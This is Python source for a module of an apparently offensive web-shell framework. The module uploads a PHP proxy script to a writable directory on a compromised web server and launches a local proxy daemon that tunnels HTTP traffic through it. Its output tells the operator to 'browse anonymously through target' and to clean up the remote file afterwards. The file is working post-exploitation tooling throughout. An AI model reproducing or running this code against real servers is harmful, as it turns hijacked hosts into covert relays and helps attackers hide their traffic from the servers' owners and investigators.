from modules.file.upload2web import Upload2web
from modules.net.phpproxy import Phpproxy
from core.moduleexception import ProbeSucceed, ProbeException
from core.argparse import ArgumentParser
from core.argparse import SUPPRESS
from os import path
from random import choice
from core.http.request import agent
from core.utils import url_validator
from subprocess import Popen
from sys import executable

WARN_NOT_URL = 'Not a valid URL'


class Proxy(Phpproxy):
    '''Install and run Proxy to tunnel traffic through target'''

    
    def _set_args(self):
        self.argparser.add_argument('rpath', help='Optional, upload as rpath', nargs='?')
        
        self.argparser.add_argument('-startpath', help='Upload in first writable subdirectory', metavar='STARTPATH', default='.')
        self.argparser.add_argument('-force', action='store_true')
        self.argparser.add_argument('-just-run', metavar='URL')
        self.argparser.add_argument('-just-install', action='store_true')
        self.argparser.add_argument('-lhost', default='127.0.0.1')
        self.argparser.add_argument('-lport', default='8081', type=int)
    
        self.argparser.add_argument('-chunksize', type=int, default=1024, help=SUPPRESS)
        self.argparser.add_argument('-vector', choices = self.vectors.keys(), help=SUPPRESS)


    def _get_proxy_path(self):
        return path.join(self.modhandler.modules_path, 'net', 'external', 'proxy.php')

    def _get_local_proxy_path(self):
        return path.join(self.modhandler.modules_path, 'net', 'external', 'local_proxy.py')

    def _prepare(self):
        
        if not self.args['just_run']:
            Phpproxy._prepare(self)
        else:
            if not url_validator.match(self.args['just_run']):
                raise ProbeException(self.name, '\'%s\': %s' % (self.args['just_run'], WARN_NOT_URL) )
            
            self.args['url'] = self.args['just_run']
            self.args['rpath'] = ''

    def _probe(self):
        if not self.args['just_run']:
            try:
                Phpproxy._probe(self)
            except ProbeSucceed:
                pass
            
        if not self.args['just_install']:
            self.pid = Popen([executable, self._get_local_proxy_path(), self.args['lhost'], str(self.args['lport']), self.args['url'], agent]).pid
            
    def _verify(self):
        if not self.args['just_run']:
            Phpproxy._verify(self)   
        else:
            # With just_run, suppose good result to correctly print output
            self._result = True
    
    def _stringify_result(self):
    
        Phpproxy._stringify_result(self)
        
        rpath = ' '
        if self.args['rpath']:
            rpath = '\'%s\' ' % self.args['rpath']
        
        self._result.append(self.pid)
        
        self._output = """Proxy daemon spawned, set \'http://%s:%i\' as HTTP proxy to start browsing anonymously through target.
Run ":net.proxy -just-run '%s'" to respawn local proxy daemon without reinstalling remote agent.
When not needed anymore, remove remote file with ":file.rm %s" and run locally 'kill -9 %i' to stop proxy.""" % (self.args['lhost'], self.args['lport'], self.args['url'], rpath, self.pid)

        
        
            
        